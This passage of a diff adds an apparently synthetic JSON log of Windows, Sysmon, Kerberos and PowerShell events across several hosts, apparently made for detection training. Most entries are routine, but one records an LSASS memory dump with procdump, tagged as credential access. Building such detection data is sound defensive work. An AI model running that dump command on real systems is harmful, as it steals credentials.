+      "create"
+    ]
+  },
+  {
+    "id": 326,
+    "timestamp": "2025-08-18T05:25:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 325,
+    "timestamp": "2025-08-18T05:24:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Error",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 324,
+    "timestamp": "2025-08-18T05:23:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 323,
+    "timestamp": "2025-08-18T05:22:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 322,
+    "timestamp": "2025-08-18T05:21:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 321,
+    "timestamp": "2025-08-18T05:20:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 320,
+    "timestamp": "2025-08-18T05:19:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 319,
+    "timestamp": "2025-08-18T05:18:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 318,
+    "timestamp": "2025-08-18T05:17:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 317,
+    "timestamp": "2025-08-18T05:16:00Z",
+    "host": "WS01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 316,
+    "timestamp": "2025-08-18T05:15:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 315,
+    "timestamp": "2025-08-18T05:14:00Z",
+    "host": "SQL01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 314,
+    "timestamp": "2025-08-18T05:13:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Warning",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 313,
+    "timestamp": "2025-08-18T05:12:00Z",
+    "host": "WS02",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 312,
+    "timestamp": "2025-08-18T05:11:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 311,
+    "timestamp": "2025-08-18T05:10:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 10,
+    "level": "Error",
+    "image": "C:\\Tools\\procdump64.exe",
+    "command_line": "procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
+    "target_process": "C:\\Windows\\System32\\lsass.exe",
+    "attack_category": "Credential Access (LSASS Dump)",
+    "attack_technique": "T1003.001",
+    "message": "Process procdump64.exe opened lsass.exe with high privileges (AccessMask: 0x1FFFFF).",
+    "tags": [
+      "attack",
+      "lsass",
+      "dump"
+    ]
+  },
+  {
+    "id": 310,
+    "timestamp": "2025-08-18T05:09:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "C:\\Windows\\System32\\rundll32.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 309,
+    "timestamp": "2025-08-18T05:08:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 308,
+    "timestamp": "2025-08-18T05:07:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Warning",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 307,
+    "timestamp": "2025-08-18T05:06:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 306,
+    "timestamp": "2025-08-18T05:05:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 305,
+    "timestamp": "2025-08-18T05:04:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 304,
+    "timestamp": "2025-08-18T05:03:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 303,
+    "timestamp": "2025-08-18T05:02:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 302,
+    "timestamp": "2025-08-18T05:01:00Z",
+    "host": "WS02",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 301,
+    "timestamp": "2025-08-18T05:00:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 300,
+    "timestamp": "2025-08-18T04:59:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 299,
+    "timestamp": "2025-08-18T04:58:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 298,
+    "timestamp": "2025-08-18T04:57:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 297,
+    "timestamp": "2025-08-18T04:56:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 296,
+    "timestamp": "2025-08-18T04:55:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\svchost.exe",
+    "command_line": "C:\\Windows\\System32\\svchost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 295,
+    "timestamp": "2025-08-18T04:54:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 294,
+    "timestamp": "2025-08-18T04:53:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 293,
+    "timestamp": "2025-08-18T04:52:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 292,
+    "timestamp": "2025-08-18T04:51:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 291,
+    "timestamp": "2025-08-18T04:50:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Warning",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 290,
+    "timestamp": "2025-08-18T04:49:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 289,
+    "timestamp": "2025-08-18T04:48:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 288,
+    "timestamp": "2025-08-18T04:47:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 287,
+    "timestamp": "2025-08-18T04:46:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 286,
+    "timestamp": "2025-08-18T04:45:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 285,
+    "timestamp": "2025-08-18T04:44:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 284,
+    "timestamp": "2025-08-18T04:43:00Z",
+    "host": "WS02",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 283,
+    "timestamp": "2025-08-18T04:42:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 282,
+    "timestamp": "2025-08-18T04:41:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 281,
+    "timestamp": "2025-08-18T04:40:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 280,
+    "timestamp": "2025-08-18T04:39:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 279,
+    "timestamp": "2025-08-18T04:38:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 278,
+    "timestamp": "2025-08-18T04:37:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 277,
+    "timestamp": "2025-08-18T04:36:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 276,
+    "timestamp": "2025-08-18T04:35:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 275,
+    "timestamp": "2025-08-18T04:34:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 274,
+    "timestamp": "2025-08-18T04:33:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 273,
+    "timestamp": "2025-08-18T04:32:00Z",
+    "host": "DC01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 272,
+    "timestamp": "2025-08-18T04:31:00Z",
+    "host": "WS02",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 271,
+    "timestamp": "2025-08-18T04:30:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 270,
+    "timestamp": "2025-08-18T04:29:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 269,
+    "timestamp": "2025-08-18T04:28:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 268,
+    "timestamp": "2025-08-18T04:27:00Z",
+    "host": "FILE01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 267,
+    "timestamp": "2025-08-18T04:26:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 266,
+    "timestamp": "2025-08-18T04:25:00Z",
+    "host": "WS01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Warning",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 265,
+    "timestamp": "2025-08-18T04:24:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 264,
+    "timestamp": "2025-08-18T04:23:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 263,
+    "timestamp": "2025-08-18T04:22:00Z",
+    "host": "DC01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 262,
+    "timestamp": "2025-08-18T04:21:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 261,
+    "timestamp": "2025-08-18T04:20:00Z",
+    "host": "WEB01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 260,
+    "timestamp": "2025-08-18T04:19:00Z",
+    "host": "SQL01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 259,
+    "timestamp": "2025-08-18T04:18:00Z",
+    "host": "WS02",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 258,
+    "timestamp": "2025-08-18T04:17:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 257,
+    "timestamp": "2025-08-18T04:16:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 256,
+    "timestamp": "2025-08-18T04:15:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 255,
+    "timestamp": "2025-08-18T04:14:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 254,
+    "timestamp": "2025-08-18T04:13:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 253,
+    "timestamp": "2025-08-18T04:12:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 252,
+    "timestamp": "2025-08-18T04:11:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 251,
+    "timestamp": "2025-08-18T04:10:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Warning",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 250,
+    "timestamp": "2025-08-18T04:09:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\svchost.exe",
+    "command_line": "C:\\Windows\\System32\\svchost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 249,
+    "timestamp": "2025-08-18T04:08:00Z",
+    "host": "WS02",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Error",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 248,
+    "timestamp": "2025-08-18T04:07:00Z",
+    "host": "SQL01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 247,
+    "timestamp": "2025-08-18T04:06:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 246,
+    "timestamp": "2025-08-18T04:05:00Z",
+    "host": "WS01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 245,
+    "timestamp": "2025-08-18T04:04:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 244,
+    "timestamp": "2025-08-18T04:03:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 243,
+    "timestamp": "2025-08-18T04:02:00Z",
+    "host": "SQL01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Warning",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 242,
+    "timestamp": "2025-08-18T04:01:00Z",
+    "host": "DC01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Warning",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 241,
+    "timestamp": "2025-08-18T04:00:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 240,
+    "timestamp": "2025-08-18T03:59:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 239,
+    "timestamp": "2025-08-18T03:58:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Warning",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 238,
+    "timestamp": "2025-08-18T03:57:00Z",
+    "host": "WS01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 237,
+    "timestamp": "2025-08-18T03:56:00Z",
+    "host": "WS02",
+    "user": "guest",
